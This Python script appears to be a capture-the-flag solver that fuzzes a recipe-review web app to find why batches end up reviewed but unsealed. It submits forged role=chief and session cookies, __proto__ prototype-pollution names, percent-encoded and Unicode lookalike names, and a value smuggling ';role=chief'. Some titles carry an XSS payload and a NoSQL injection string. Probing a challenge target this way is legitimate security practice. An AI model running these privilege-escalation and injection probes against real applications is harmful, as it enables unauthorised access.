#!/usr/bin/env python3
"""Look for an APP-SIDE reason for a batch to end `reviewed` but unsealed.

The size jam explains the state without the application ever deciding anything: the
verdict request just dies at Node's 16 KB header limit. That is only half useful if the
Chief's own stamp would die on the same cookies, because a robot that loads the batch
page writes the same ingredient cookies. So the interesting alternative is a handler that
*receives* the request and deliberately does not write a seal - a deferral, which is what
"escalate to the Chief" looks like in code.

A deferral is findable without waiting for anyone: keep every probe batch far below 16 KB
(<= 20 short ingredients) so the overflow cannot explain the result, submit, and see which
ones come back `reviewed` with an empty Seal cell. Every shape below is a plausible
handler-side branch: cookie-name collisions with the app's own cookies, case and
percent-decoding tricks against cookie-parser, reserved `__Host-`/`__Secure-` prefixes,
`__proto__` as a cookie name, empty/zero-ingredient batches, duplicate names, values the
sanitiser rewrites, and titles that read like an escalation request.
"""
import re
import sys
import time

from cc import Client, new_baker


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


SHAPES = [
    ("zero-ingredients", []),
    ("empty-value", [{"name": "flour", "value": ""}]),
    ("name-only", [{"name": "flour"}]),
    ("dup-names", [{"name": "flour", "value": "1"}, {"name": "flour", "value": "2"}]),
    ("cookie-session", [{"name": "session", "value": "deadbeef"}]),
    ("cookie-role-chief", [{"name": "role", "value": "chief"}]),
    ("cookie-role-insp", [{"name": "role", "value": "inspector"}]),
    ("cookie-ROLE-case", [{"name": "ROLE", "value": "chief"}, {"name": "Role", "value": "inspector"}]),
    ("cookie-chief-name", [{"name": "chief", "value": "1"}]),
    ("cookie-golden-name", [{"name": "golden_seal", "value": "1"}]),
    ("cookie-escalate", [{"name": "escalate", "value": "chief"}, {"name": "review_level", "value": "gold"}]),
    ("cookie-proto", [{"name": "__proto__", "value": "chief"}, {"name": "constructor", "value": "chief"}]),
    ("cookie-host", [{"name": "__Host-role", "value": "chief"}, {"name": "__Secure-role", "value": "chief"}]),
    ("pct-name", [{"name": "%72ole", "value": "chief"}]),
    ("pct-value", [{"name": "x1", "value": "%3Brole%3Dchief"}, {"name": "x2", "value": "a%3Dchief"}]),
    ("eq-in-value", [{"name": "x3", "value": "role=chief"}]),
    ("uni-name", [{"name": "\uff52ole", "value": "chief"}]),
    ("long-20", [{"name": "ing%02d" % i, "value": "v%d" % i} for i in range(20)]),
    ("title-chief", [{"name": "flour", "value": "1"}]),
    ("title-appeal", [{"name": "flour", "value": "1"}]),
    ("value-sun", [{"name": "flag", "value": "sun"}]),
    ("value-true", [{"name": "approved", "value": "true"}, {"name": "certified", "value": "1"}]),
    ("dot-names", [{"name": "role.chief", "value": "1"}, {"name": "a[b]", "value": "c"}]),
    ("dangerous", [{"name": "cyanide", "value": "1pinch"}, {"name": "plutonium", "value": "2g"}]),
]
TITLES = ["plain batch", "", " ", "chief please review", "THE CHIEF'S OWN RECIPE",
          "appeal: escalate to chief", "golden", "legendary", "escalate", "sun{test}",
          "<script>alert(1)</script>", "{\"$ne\":1}"]


def seal_of(c, rid):
    s, st = "norow", ""
    for k in range(3):
        code, dash, dt = c.get("/dashboard")
        if code == 401:
            c.post("/login", {"username": c.user, "password": "Passw0rd!"})
            continue
        blk = re.search(r"<tr>(?:(?!</tr>).)*?%s(?:(?!</tr>).)*?</tr>" % rid, dash, re.S)
        if not blk:
            time.sleep(1)
            continue
        b = blk.group(0)
        stt = re.search(r'class="pill (\w+)">(\w+)</span>', b)
        tail = " ".join(re.sub(r"<[^>]+>", " ", b.split("</span>")[-1]).split())
        s = "NONE" if "&mdash;" in tail else ("standard" if "standard" in tail else tail[:26])
        st = stt.group(2) if stt else "?"
        break
    return s, st


def wait_reviewed(c, rid, limit=110):
    t0 = time.time()
    s = st = ""
    while time.time() - t0 < limit:
        time.sleep(6)
        s, st = seal_of(c, rid)
        if st == "reviewed":
            return s, st, int(time.time() - t0)
    return s, st, int(time.time() - t0)
u, c, _ = new_baker("sh")
c.user = u
count = 0
results = []
log("user", u)
for i, (tag, ings) in enumerate(SHAPES):
    if count >= 8:
        u, c, _ = new_baker("sh")
        c.user = u
        count = 0
        log("new user %s" % u)
    title = TITLES[i % len(TITLES)]
    body = {"title": title, "ingredients": ings}
    if tag == "name-only":
        pass
    code, out, dt = c.post("/api/recipe", body)
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        log("  %-18s save refused %s %s" % (tag, code, str(out)[:60]))
        continue
    count += 1
    scode, sout, _ = c.post("/api/recipe/%s/submit" % rid, {})
    if not (isinstance(sout, dict) and sout.get("ok")):
        for _k in range(6):
            time.sleep(10)
            scode, sout, _ = c.post("/api/recipe/%s/submit" % rid, {})
            if isinstance(sout, dict) and sout.get("ok"):
                break
    seal, st, secs = wait_reviewed(c, rid)
    log("  %-18s -> %-8s %s (%ds)" % (tag, st, seal, secs))
    results.append((tag, seal, st))
    if seal not in ("standard",):
        log("     !!! not sealed: %s (title=%r)" % (tag, title))
        code, page, _ = c.get("/recipe/%s" % rid)
        open("../files/shape_%s.html" % tag, "w", encoding="utf-8").write(str(page))

log("=== summary: shapes that did NOT get a standard seal ===")
for tag, seal, st in results:
    if seal != "standard":
        log("   %-18s %s %s" % (tag, st, seal))
log("done")
